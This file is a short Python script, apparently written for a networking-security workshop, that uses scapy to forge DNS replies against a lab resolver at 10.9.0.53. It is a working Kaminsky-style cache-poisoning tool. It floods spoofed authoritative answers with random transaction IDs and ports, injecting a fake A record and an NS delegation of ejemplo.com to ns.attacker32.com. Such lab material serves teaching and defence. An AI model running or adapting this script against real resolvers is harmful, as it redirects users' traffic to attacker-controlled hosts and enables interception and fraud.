#!/usr/bin/env python3
"""Inyección de respuestas DNS forjadas (Taller 2 PDF)."""
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
import random
import sys

TARGET = "10.9.0.53"
AUTH = "10.9.0.120"
FAKE_IP = "1.1.1.1"
FAKE_NS = "ns.attacker32.com."


def inyectar_respuesta_forjada(domain_query):
    trans_id = random.randint(1, 65535)
    puerto_destino = random.randint(1024, 65535)
    packet = (
        IP(src=AUTH, dst=TARGET)
        / UDP(sport=53, dport=puerto_destino)
        / DNS(
            id=trans_id,
            qr=1,
            aa=1,
            qd=DNSQR(qname=domain_query, qtype="A"),
            an=DNSRR(rrname=domain_query, type="A", ttl=86400, rdata=FAKE_IP),
            ns=DNSRR(rrname="ejemplo.com.", type="NS", ttl=86400, rdata=FAKE_NS),
            ar=DNSRR(
                rrname=FAKE_NS, type="A", rclass="IN", ttl=86400, rdata="10.9.0.153"
            ),
        )
    )
    send(packet, verbose=False)
    print(f"[+] Sonda inyectada: Puerto_Destino={puerto_destino} | TXID={trans_id}")


def flood(domain_query, count=80):
    print(f"[*] Inundando resolvedor con respuestas forjadas para {domain_query}")
    for _ in range(count):
        inyectar_respuesta_forjada(domain_query)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 dns_poison.py <Subdominio_Aleatorio> [repeticiones]")
        sys.exit(1)
    sub = sys.argv[1]
    reps = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    domain = f"{sub}.ejemplo.com."
    if reps > 1:
        flood(domain, reps)
    else:
        inyectar_respuesta_forjada(domain)
    flood("test.ejemplo.com.", 40)
